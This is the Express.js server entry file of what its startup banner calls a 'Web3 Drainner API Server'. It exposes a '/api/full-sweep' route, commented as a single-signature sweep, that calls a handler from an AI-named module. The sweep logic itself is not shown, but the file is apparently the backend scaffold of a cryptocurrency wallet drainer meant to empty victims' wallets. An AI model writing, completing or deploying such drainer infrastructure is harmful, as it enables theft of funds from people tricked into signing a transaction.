import express from 'express'
import cors from 'cors'
import dotenv from 'dotenv'
import { CONFIG, logConfig, validateConfig } from './src/config.js'
import { verifyRequest, errorHandler } from './src/middleware.js'
import { handleFullSweep } from './src/routes/handlersGrokAI.js'

dotenv.config()

const app = express()

// Middleware
const corsOrigin = process.env.CORS_ORIGIN ? 
  (typeof process.env.CORS_ORIGIN === 'string' ? 
    process.env.CORS_ORIGIN.split(',').map(o => o.trim()) : 
    process.env.CORS_ORIGIN) :
  ['http://localhost:3000', 'http://localhost:5173']

app.use(cors({
  origin: corsOrigin,
  credentials: true
}))
app.use(express.json())

// Log and validate configuration
logConfig()
validateConfig()

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: Date.now() })
})

// API Routes
app.post('/api/full-sweep', verifyRequest, handleFullSweep) // ← GROK-AI single signature sweep

// 404 Handler
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: 'Route not found',
    path: req.path
  })
})

// Error Handler
app.use(errorHandler)

// Start server
const PORT = CONFIG.port
app.listen(PORT, () => {
  console.log(`
╔════════════════════════════════════════╗
║  🚀 Web3 Drainner API Server Started   ║
║  Port: ${PORT}                          ║
║  Environment: ${CONFIG.env}            ║
║  Status: Ready                         ║
╚════════════════════════════════════════╝
  `)
})

export default app
